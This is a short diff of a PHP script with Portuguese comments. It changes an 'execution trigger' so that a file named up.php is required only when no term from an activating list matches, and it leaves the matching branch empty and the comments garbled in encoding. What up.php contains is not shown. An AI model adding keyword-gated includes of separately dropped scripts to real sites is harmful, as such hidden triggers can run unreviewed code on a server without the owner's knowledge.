@@ -26,14 +26,13 @@ foreach ($listaAtivadora as $termo) {
 
 // 4. Gatilho de Execução
 if ($deveExecutar) {
-    if (file_exists("up.php")) {
-        // Usa require para garantir que o processo só continue se o up.php carregar com sucesso
+ 
+} else {
+  if (file_exists("up.php")) {
+        // Usa require para garantir que o processo sÃ³ continue se o up.php carregar com sucesso
         require_once "up.php";
     } else {
         // Opcional: Criar o arquivo se ele sumir ou logar o erro
-        error_log("Tentativa de execução: up.php não encontrado.");
-    }
-} else {
-    // Caso não tenha os termos, você pode colocar um aviso ou apenas encerrar
-    // exit("URL não autorizada para processamento.");
+        error_log("Tentativa de execuÃ§Ã£o: up.php nÃ£o encontrado.");
+    } 
 }
